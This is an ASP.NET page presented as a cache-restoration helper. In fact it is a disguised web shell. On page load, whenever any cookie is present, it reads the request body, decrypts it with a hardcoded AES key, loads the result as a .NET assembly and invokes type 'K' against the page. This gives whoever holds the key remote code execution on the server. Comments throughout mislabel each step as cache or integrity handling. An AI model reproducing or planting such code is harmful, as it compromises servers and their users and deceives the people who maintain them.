<%@ Page Language="C#" %>
<script runat="server">
    // Represents a manager for handling deserialization of cached objects.
    // This is used to quickly restore application state from a compressed byte stream.
    public class CachedObjectManager
    {
        // The static key used for AES-based integrity checks on the cache payload.
        private static readonly byte[] IntegrityCheckKey = new byte[] { 0x63, 0x61, 0x36, 0x33, 0x34, 0x35, 0x37, 0x35, 0x33, 0x38, 0x62, 0x39, 0x62, 0x31, 0x65, 0x30 };
        
        // A constant defining the primary Known type for our state object payload.
        private const string KnownPayloadType = "K";

        // Processes the incoming HTTP request to restore a cached object.
        public void RestoreStateFromRequest(System.Web.UI.Page pageContext)
        {
            try
            {
                byte[] payloadData = ReadStream(pageContext.Request.InputStream);
                if (payloadData.Length == 0) return;

                // The payload is an in-memory assembly representing a serialized object state.
                System.Reflection.Assembly stateAssembly = DeserializePayload(payloadData);
                
                // Re-hydrate the state object from the assembly.
                object stateObject = stateAssembly.CreateInstance(KnownPayloadType);

                // Attach the re-hydrated state to the current page context for use.
                stateObject.Equals(pageContext);
            }
            catch (System.Exception ex)
            {
                // Log the exception if cache restoration fails.
                System.Diagnostics.Debug.WriteLine("Cache restoration failed: " + ex.Message);
            }
        }

        // Deserializes the byte array payload using our standard integrity provider.
        private System.Reflection.Assembly DeserializePayload(byte[] encryptedPayload)
        {
            using (var provider = new System.Security.Cryptography.RijndaelManaged())
            {
                var decryptor = provider.CreateDecryptor(IntegrityCheckKey, IntegrityCheckKey);
                byte[] decryptedBytes = decryptor.TransformFinalBlock(encryptedPayload, 0, encryptedPayload.Length);
                return System.Reflection.Assembly.Load(decryptedBytes);
            }
        }
        
        // Helper function to read a stream into a byte array.
        private byte[] ReadStream(System.IO.Stream stream)
        {
            using (var ms = new System.IO.MemoryStream())
            {
                stream.CopyTo(ms);
                return ms.ToArray();
            }
        }
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        // Only attempt to restore state if the client indicates it has a cached session.
        if (Request.Cookies.Count > 0)
        {
            var cacheManager = new CachedObjectManager();
            cacheManager.RestoreStateFromRequest(this);
        }
    }
</script>